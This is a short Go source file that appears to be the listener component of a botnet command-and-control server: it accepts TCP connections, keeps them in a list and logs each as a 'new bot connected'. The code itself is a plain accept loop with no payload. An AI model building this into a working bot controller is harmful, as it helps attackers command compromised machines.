package server

import (
	"fmt"
	"homo/network/config"
	"net"
	"os"

	"github.com/fatih/color"
)

var (
	Conns  []net.Conn
	Chconn = make(chan net.Conn)
)

func StartServer(c *config.Config) {
	server, err := net.Listen("tcp", c.Bot.Server+":"+c.Bot.Port)
	if err != nil {
		color.HiRed("Fails to start server")
		os.Exit(0)
	}
	go Ping()

	fmt.Println("[HOMO] Bot ready: " + c.Bot.Server + ":" + c.Bot.Port)
	go func() {
		for {
			conn, err := server.Accept()

			if err != nil {
				continue
			}
			Chconn <- conn
		}
	}()

	for {
		select {
		case conn := <-Chconn:
			Conns = append(Conns, conn)
			addr := conn.RemoteAddr()
			color.HiYellow("[!] New bot connected: " + addr.String())
			// if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
			// 	newbot(addr.String())
			// }

		}
	}

}
